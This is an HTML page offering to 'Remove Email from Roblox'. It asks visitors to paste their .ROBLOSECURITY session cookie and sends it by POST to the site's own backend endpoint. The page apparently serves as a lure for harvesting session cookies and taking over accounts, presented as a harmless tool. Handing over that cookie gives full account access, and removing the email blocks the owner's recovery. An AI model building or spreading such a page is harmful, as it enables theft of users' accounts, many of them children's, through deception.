<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Remove Email from Roblox</title>
</head>
<body>
  <h2>Remove Email from Roblox</h2>
  <form id="remove-form">
    <label>.ROBLOSECURITY Cookie:</label><br/>
    <input type="text" id="cookie" name="cookie" required style="width: 100%;"><br/><br/>
    <button type="submit">Remove Email</button>
  </form>
  <p id="response"></p>

  <script>
    const form = document.getElementById('remove-form');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const cookie = document.getElementById('cookie').value;

      const res = await fetch('/api/remove-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie })
      });

      const data = await res.json();
      document.getElementById('response').textContent = data.message || 'Done.';
    });
  </script>
</body>
</html>
